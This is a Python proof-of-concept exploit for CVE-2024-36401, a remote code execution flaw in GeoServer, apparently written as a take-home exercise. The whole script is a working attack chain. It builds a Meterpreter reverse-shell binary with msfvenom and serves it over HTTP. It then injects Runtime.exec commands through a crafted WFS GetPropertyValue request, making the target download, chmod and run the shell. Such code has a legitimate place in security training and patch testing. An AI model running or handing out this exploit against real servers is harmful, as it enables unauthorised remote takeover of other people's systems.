import os
import subprocess
import time
import sys
import http.server
import socketserver
import threading
import urllib.parse
import socket


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    END = '\033[0m'


ASCII_ART = """
 ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄           
▐░░▌     ▐░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌          ▐░▌          
▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌          
▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌          
▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░▌          
▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░▌          
▐░▌   ▀   ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌          
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌                    ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌          
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌           ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌

CVE-2024-36401 PoC (Take Home Exercise)
RCE in GeoServer
By N.A
"""

def runCmd(cmd, shell=False):
    try:
        if shell:
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            proc = subprocess.run(cmd, capture_output=True, text=True)
        if proc.returncode != 0:
            print(f"{Colors.RED}[!] Error running command: {cmd}{Colors.END}")
            print(proc.stderr)
            return False
        return proc.stdout
    except Exception as e:
        print(f"{Colors.RED}[!] Exception running command: {cmd}{Colors.END}")
        print(str(e))
        return False

def genPayload(ip, port, dir):
    p = "linux/x86/meterpreter_reverse_tcp"
    outfile = os.path.join(dir, "shell")
    cmd = [
        "msfvenom",
        "-p", p,
        f"LHOST={ip}",
        f"LPORT={port}",
        "-f", "elf",
        "-o", outfile
    ]
    print(f"{Colors.YELLOW}[*] Generating 32-bit Meterpreter payload for Debian (i686)...{Colors.END}")
    print(f"{Colors.YELLOW}[*] Running command: {' '.join(cmd)}{Colors.END}")
    res = runCmd(cmd)
    if res is False:
        print(f"{Colors.RED}[!] Failed to generate payload. Check the error above.{Colors.END}")
        return False
    print(f"{Colors.YELLOW}[*] Waiting 5 seconds for payload generation to complete...{Colors.END}")
    time.sleep(5)
    if os.path.exists(outfile):
        print(f"{Colors.GREEN}[+] Payload generated: {outfile}{Colors.END}")
        fileType = runCmd(["file", outfile])
        if fileType and "32-bit" in fileType:
            print(f"{Colors.GREEN}[+] Confirmed: Payload is 32-bit ELF binary.{Colors.END}")
        else:
            print(f"{Colors.RED}[!] Payload is not a 32-bit ELF binary. Exiting.{Colors.END}")
            return False
        return True
    else:
        print(f"{Colors.RED}[!] Payload file not found: {outfile}{Colors.END}")
        return False

def startWeb(dir, port):
    os.chdir(dir)
    H = http.server.SimpleHTTPRequestHandler
    srv = socketserver.TCPServer(("", port), H)
    print(f"{Colors.YELLOW}[*] Starting web server on port {port}...{Colors.END}")
    srvThread = threading.Thread(target=srv.serve_forever)
    srvThread.daemon = True
    srvThread.start()
    time.sleep(2)
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=5):
            print(f"{Colors.GREEN}[+] Web server is running and accessible on port {port}.{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Failed to start web server on port {port}: {str(e)}{Colors.END}")
        srv.shutdown()
        srv.server_close()
        sys.exit(1)
    return srv

def stopWeb(srv):
    print(f"{Colors.YELLOW}[*] Shutting down web server...{Colors.END}")
    srv.shutdown()
    srv.server_close()


def sendCurl(url, cmd):
    encCmd = urllib.parse.quote(cmd)
    curl = (
        f"curl -G \"{url}\" "
        f"-d \"service=WFS\" "
        f"-d \"version=2.0.0\" "
        f"-d \"request=GetPropertyValue\" "
        f"-d \"typeNames=topp:states\" "
        f"-d \"valueReference=exec(java.lang.Runtime.getRuntime(),%20'{encCmd}')\""
    )
    print(f"{Colors.YELLOW}[*] Sending curl command: {cmd}{Colors.END}")
    output = runCmd(curl, shell=True)
    if output:
        print(f"{Colors.GREEN}[+] Command executed successfully{Colors.END}")
        return True
    return False

def main():
    ip = input("Enter your IP: ").strip()
    port = input("Enter your port for Meterpreter: ").strip()
    url = input("Enter the target GeoServer URL: ").strip()
    webPort = input("Enter the web server port to host the payload: ").strip()
    dir = input("Enter directory to store the payload: ").strip()

    if not ip or not port or not url or not webPort or not dir:
        print(f"{Colors.RED}[!] All inputs are required!{Colors.END}")
        sys.exit(1)

    if not os.path.exists(dir):
        print(f"{Colors.YELLOW}[*] Creating directory: {dir}{Colors.END}")
        os.makedirs(dir)

    if not genPayload(ip, port, dir):
        print(f"{Colors.RED}[!] Failed to generate payload. Exiting.{Colors.END}")
        sys.exit(1)

    srv = startWeb(dir, int(webPort))


    dlCmd = f"wget http://{ip}/shell -O /tmp/shell"
    if not sendCurl(url, dlCmd):
        print(f"{Colors.RED}[!] Failed to download the payload. Exiting.{Colors.END}")
        stopWeb(srv)
        sys.exit(1)

    stopWeb(srv)

    chmodCmd = "chmod +x /tmp/shell"
    if not sendCurl(url, chmodCmd):
        print(f"{Colors.RED}[!] Failed to make the payload executable. Exiting.{Colors.END}")
        sys.exit(1)

    execCmd = "/tmp/shell"
    if not sendCurl(url, execCmd):
        print(f"{Colors.RED}[!] Failed to execute the payload. Exitingg.{Colors.END}")
        sys.exit(1)

    print(f"{Colors.GREEN}[+] Exploit completed! You should have a Meterpreter session.{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Script interrupted by user. Exiting.{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[!] An unexpected error occurred: {str(e)}{Colors.END}")
        sys.exit(1)
